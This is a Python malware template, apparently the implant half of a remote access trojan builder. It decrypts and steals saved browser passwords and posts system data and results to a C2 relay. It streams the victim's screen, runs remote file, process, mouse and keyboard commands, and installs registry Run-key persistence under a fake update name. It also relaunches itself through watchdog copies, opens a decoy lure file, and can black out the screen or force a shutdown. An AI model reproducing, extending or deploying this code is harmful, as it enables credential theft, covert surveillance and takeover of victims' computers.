# payload_template.py (Definitive, Ultimate, Unabridged & Fully Functional Agent)

import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, io, zlib, random, sqlite3

# --- Graceful Import Handling ---
try: from mss import mss
except ImportError: mss = None
try: from PIL import Image
except ImportError: Image = None
try: from pynput.mouse import Button, Controller as MouseController
except ImportError: MouseController = None
try: from pynput.keyboard import Key, Controller as KeyboardController
except ImportError: KeyboardController = None
try: import win32crypt
except ImportError: win32crypt = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import tkinter
except ImportError: tkinter = None
try: from PIL import ImageTk
except ImportError: ImageTk = None
try: import winsound
except ImportError: winsound = None
try: import ctypes
except ImportError: ctypes = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
SESSION_ID = str(uuid.uuid4())
STEALTH_MODE = {{STEALTH_MODE}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
REVIVE_MSG_ENABLED = {{REVIVE_MSG_ENABLED}}
REVIVE_TITLE = {{REVIVE_TITLE}}
REVIVE_MESSAGE = {{REVIVE_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State & Config ---
results_to_send, results_lock = [], threading.Lock()
stream_active, webcam_active = False, False
mouse = MouseController() if MouseController else None
keyboard = KeyboardController() if KeyboardController else None
lag_event, sound_event, overlay_event, blackout_event = None, None, None, None
overlay_window, blackout_window = None, None
CHUNK_SIZE = 1024 * 512

# --- HELPER FUNCTIONS ---
def find_browser_dbs(db_name):
    db_paths = []; base_paths = { "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"), "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"), "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data") }
    for browser, path in base_paths.items():
        if not os.path.exists(path): continue
        for profile in os.listdir(path):
            if profile.startswith("Profile ") or profile == "Default":
                full_db_path = os.path.join(path, profile, db_name)
                if os.path.exists(full_db_path): db_paths.append((browser, profile, full_db_path))
    return db_paths
def decrypt_data(encrypted_data):
    try: return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8', 'ignore')
    except: return "Failed to decrypt (DPAPI Error)"
def resilient_copy(src, dest):
    try: shutil.copy2(src, dest); return True
    except: return False

# --- FULL SUITE OF HARVESTING FUNCTIONS ---
def harvest_system_info():
    try:
        uname = platform.uname(); ip = "N/A"
        try: ip = requests.get('https://api.ipify.org', timeout=10, verify=False).text
        except: pass
        data = { "hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "ip": ip, "arch": uname.machine }
        return {"status": "success", "data": data}
    except Exception as e: return {"status": "error", "data": {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system(), "ip": "Error", "arch": "Error"}}
def harvest_installed_apps():
    try:
        if not winreg: return {"status": "error", "data": "winreg not available"}
        apps = []
        for path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    skey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                    try:
                        name = winreg.QueryValueEx(skey, 'DisplayName')[0]; version = winreg.QueryValueEx(skey, 'DisplayVersion')[0]; publisher = winreg.QueryValueEx(skey, 'Publisher')[0]
                        if name and name not in [a['name'] for a in apps]: apps.append({"name": name, "version": version, "publisher": publisher})
                    except: pass
            except: pass
        return {"status": "success", "data": sorted(apps, key=lambda x: x['name'])}
    except Exception as e: return {"status": "error", "data": str(e)}
def harvest_processes():
    try:
        processes = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]; return {"status": "success", "data": sorted(processes, key=lambda p: p['name'])}
    except Exception as e: return {"status": "error", "data": str(e)}
def harvest_browser_passwords():
    try:
        creds = []
        for browser, profile, db_path in find_browser_dbs('Login Data'):
            temp_path = os.path.join(os.environ["TEMP"], f"login_{uuid.uuid4()}");
            if not resilient_copy(db_path, temp_path): continue
            conn = sqlite3.connect(temp_path); conn.text_factory = bytes
            for row in conn.cursor().execute("SELECT origin_url, username_value, password_value FROM logins"):
                url, username = (val.decode(errors='ignore') if isinstance(val, bytes) else val for val in row[:2])
                if all(row):
                    password = decrypt_data(row[2])
                    creds.append({"browser": browser, "profile": profile, "url": url, "username": username, "password": password})
            conn.close(); os.remove(temp_path)
        return {"status": "success", "data": creds}
    except Exception as e: return {"status": "error", "data": str(e)}

# --- FULL SUITE OF LIVE ACTIONS ---
def _action_popup(params):
    if ctypes: ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
def _action_open_url(params):
    url = params.get('url')
    if url: os.system(f'start "" "{url}"')
def _action_shutdown(params): os.system("shutdown /s /t 1 /f")
def _action_restart(params): os.system("shutdown /r /t 1 /f")
def _action_start_sounds(params):
    global sound_event
    if sound_event and not sound_event.is_set(): return
    sound_event = threading.Event(); threading.Thread(target=_worker_annoying_sounds, args=(sound_event,), daemon=True).start()
def _action_stop_sounds(params):
    if sound_event: sound_event.set()
def _action_start_blackout(params):
    global blackout_event
    if blackout_event and not blackout_event.is_set(): return
    blackout_event = threading.Event(); threading.Thread(target=_worker_blackout_screen, args=(blackout_event,), daemon=True).start()
def _action_stop_blackout(params):
    global blackout_window, blackout_event
    if blackout_event: blackout_event.set()
    if blackout_window:
        try: blackout_window.destroy()
        except: pass

# --- FILE & PROCESS MANAGEMENT ACTIONS ---
def _action_list_directory(params):
    path = params.get('path', 'C:\\'); items = []
    for item in os.listdir(path):
        full_path = os.path.join(path, item)
        try:
            is_dir = os.path.isdir(full_path)
            size = os.path.getsize(full_path) if not is_dir else 0
            items.append({"name": item, "type": "folder" if is_dir else "file", "size": size})
        except OSError: continue
    return {"status": "success", "data": {"path": path, "items": items}}
def _action_kill_process(params):
    pid = params.get('pid'); psutil.Process(pid).kill(); return {"status": "success", "data": f"Process {pid} killed."}
def _action_suspend_process(params):
    pid = params.get('pid'); psutil.Process(pid).suspend(); return {"status": "success", "data": f"Process {pid} suspended."}
def _action_resume_process(params):
    pid = params.get('pid'); psutil.Process(pid).resume(); return {"status": "success", "data": f"Process {pid} resumed."}
def _action_delete_file(params):
    path = params.get('path')
    if os.path.isdir(path): shutil.rmtree(path)
    else: os.remove(path)
    return {"status": "success", "data": f"Deleted: {path}"}
def _action_new_folder(params):
    path = params.get('path'); os.makedirs(path, exist_ok=True)
    return {"status": "success", "data": f"Created folder: {path}"}
def _action_download_chunk(params):
    path = params.get('path'); chunk_num = params.get('chunk_num')
    with open(path, 'rb') as f:
        f.seek(chunk_num * CHUNK_SIZE)
        chunk_data = f.read(CHUNK_SIZE); is_last = len(chunk_data) < CHUNK_SIZE
        return {"status": "success", "data": {"chunk": base64.b64encode(chunk_data).decode(), "is_last": is_last, "chunk_num": chunk_num}}
def _action_upload_chunk(params):
    path = params.get('path'); chunk_data = params.get('chunk'); is_first = params.get('is_first')
    if is_first and os.path.exists(path): os.remove(path)
    with open(path, 'ab') as f: f.write(base64.b64decode(chunk_data))
    return {"status": "success"}

# --- WORKER THREADS FOR LIVE ACTIONS ---
def _worker_annoying_sounds(stop_event):
    while not stop_event.is_set():
        try: ctypes.windll.user32.MessageBeep(random.choice([0, 16, 32, 48, 64])); time.sleep(random.uniform(0.5, 2.0))
        except: time.sleep(1)
def _worker_blackout_screen(stop_event):
    global blackout_window
    try:
        root = tkinter.Tk(); root.attributes('-fullscreen', True); root.attributes('-topmost', True); root.configure(bg='black'); root.overrideredirect(True)
        blackout_window = root
        def check_stop():
            if stop_event.is_set(): root.destroy()
            else: root.after(200, check_stop)
        check_stop(); root.mainloop()
    except: pass
    finally: blackout_window = None

# --- LIVE STREAMING THREADS ---
def screen_stream_thread():
    global stream_active
    if not mss: return
    with mss() as sct:
        monitor = sct.monitors[0]
        while True:
            if stream_active:
                try:
                    sct_img = sct.grab(monitor); img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    buffer = io.BytesIO(); img.save(buffer, format="JPEG", quality=50)
                    frame_b64 = base64.b64encode(zlib.compress(buffer.getvalue(), level=5)).decode()
                    payload = {"session_id": SESSION_ID, "frame_type": "screen", "frame": frame_b64, "width": sct_img.width, "height": sct_img.height}
                    requests.post(f"{RELAY_URL}/implant/stream", json=payload, timeout=5, verify=False)
                except: pass
                time.sleep(0.1)
            else: time.sleep(1)
def webcam_stream_thread(): pass # Placeholder

# --- MASTER COMMAND HANDLER ---
def execute_command(command_data):
    global stream_active, webcam_active
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    
    if action == 'start_stream': stream_active = True; return
    elif action == 'stop_stream': stream_active = False; return
    elif action == 'mouse_click' and mouse: mouse.position = (params.get('x'), params.get('y')); mouse.click(Button.left, 1); return
    elif action == 'key_press' and keyboard: keyboard.type(params.get('key')); return
    
    result = {"status": "error", "data": "Unsupported action"}; handler = None
    if action.startswith("_action_"): handler = getattr(sys.modules[__name__], action, None)
    else: handler = getattr(sys.modules[__name__], f"_action_{action}", None)
    
    if handler:
        try: result = handler(params)
        except Exception as e: result = {"status": "error", "data": f"Handler for '{action}' failed: {e}"}

    try:
        payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
        requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
    except: pass

# --- GREAT HARVEST (FOR NON-ESSENTIAL DATA) ---
def great_harvest():
    tasks = { "Installed Applications": harvest_installed_apps, "Running Processes": harvest_processes, "Browser Passwords": harvest_browser_passwords }
    for name, func in tasks.items():
        run_and_store(name, func)
def run_and_store(module_name, func):
    with results_lock:
        results_to_send.append({"command": module_name, "output": func()})

# --- INITIAL LURE & PERSISTENCE ---
def initial_lure():
    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{SESSION_ID}.flg")
    if os.path.exists(flag_file): return
    
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            os.startfile(decoy_path)
        except: pass
    with open(flag_file, 'w') as f: f.write('ran')

def install_persistence():
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "TetherFrameworkUpdate", 0, winreg.REG_SZ, sys.executable)
        except: pass

# --- C2 COMMUNICATION LOOP ---
def command_and_control_loop(initial_metadata):
    while True:
        try:
            with results_lock: outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = { "session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, "metadata": initial_metadata }
            response = requests.post(f"{RELAY_URL}/implant/heartbeat", json=heartbeat_data, timeout=40, verify=False)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except: pass
        time.sleep(5)

# --- HYDRA WATCHDOG ---
def guardian_process(worker_pid_to_watch):
    while psutil:
        if not psutil.pid_exists(worker_pid_to_watch):
            try: 
                if REVIVE_MSG_ENABLED:
                    ctypes.windll.user32.MessageBoxW(0, REVIVE_MESSAGE, REVIVE_TITLE, 0)
                subprocess.Popen([sys.executable], creationflags=subprocess.DETACHED_PROCESS)
            except: pass
            sys.exit()
        time.sleep(10)

if __name__ == "__main__":
    # --- HYDRA LOGIC (Main Process as Guardian) ---
    if HYDRA_ENABLED and len(sys.argv) < 2:
        worker_pid = os.getpid()
        for guardian_name in HYDRA_GUARDIANS:
            try:
                guardian_path = os.path.join(os.environ["TEMP"], guardian_name)
                shutil.copy2(sys.executable, guardian_path)
                subprocess.Popen([guardian_path, str(worker_pid)], creationflags=subprocess.DETACHED_PROCESS)
            except: pass

    if len(sys.argv) == 2 and sys.argv[1].isdigit():
        try: guardian_process(int(sys.argv[1]))
        except: sys.exit()

    # --- DEFINITIVE FIX: SYNCHRONOUS STARTUP SEQUENCE ---
    # 1. Gather essential system information first. This prevents race conditions.
    initial_metadata = harvest_system_info().get("data", {})
    
    # 2. Perform one-time actions (lure, persistence).
    initial_lure()
    install_persistence()
    
    # 3. Start non-essential background data collection.
    if not STEALTH_MODE: 
        threading.Thread(target=great_harvest, daemon=True).start()
    
    # 4. Start the main communication loop, passing in the complete metadata.
    threading.Thread(target=command_and_control_loop, args=(initial_metadata,), daemon=True).start()

    # 5. Start other background services.
    threading.Thread(target=screen_stream_thread, daemon=True).start()
    
    # 6. Keep the main thread alive.
    while True: 
        time.sleep(3600)